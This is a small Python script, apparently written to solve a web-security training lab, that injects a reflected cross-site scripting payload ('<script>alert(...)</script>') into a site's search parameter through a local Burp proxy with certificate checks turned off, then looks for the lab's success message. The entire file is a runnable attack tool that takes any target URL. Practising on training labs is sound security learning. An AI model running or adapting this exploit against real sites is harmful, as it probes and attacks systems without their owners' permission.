import requests
import urllib3
import re
import sys

# disable the ssl warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# make the burp porxy

proxies={
    
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def get_xss(s,url):
    # code here
    payload="<script>alert('hacked by rakshak')</script>"
    path_url=f"{url}/?search={payload}"
    # now we will be sending a get request to the url
    r=s.get(path_url,verify=False,proxies=proxies)
    res=r.text
    print("[+] Exploiting the XSS Vulnerability........................🔥")
    if "Congratulations, you solved the lab!" in res:
        print("[+] We finally got the XSS vulnerability")
    else:
        print("[-] THere is something wrong with the payload bro check it out")    
    




def main():
    # giving the instruction to the user
    if len(sys.argv)!=2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
    else:
        url=sys.argv[1]
        s=requests.Session()   
        get_xss(s,url) 



if __name__=="__main__":
    main()
